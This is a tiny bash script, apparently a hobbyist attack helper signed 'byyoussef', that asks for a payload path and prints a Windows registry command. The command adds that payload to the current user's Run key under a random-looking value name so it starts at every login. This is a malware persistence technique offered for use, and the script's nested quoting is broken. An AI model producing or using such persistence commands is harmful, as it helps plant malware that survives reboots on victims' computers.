figlet  byyoussef

echo  "put payload full path to add to startup"
read payload

echo -e "reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "ppdSjpCDtMPqMUCdT" /t REG_SZ /F /D "$payload""

echo -e "generating code"

sleep 1s

echo "done" 

echo "byebye"
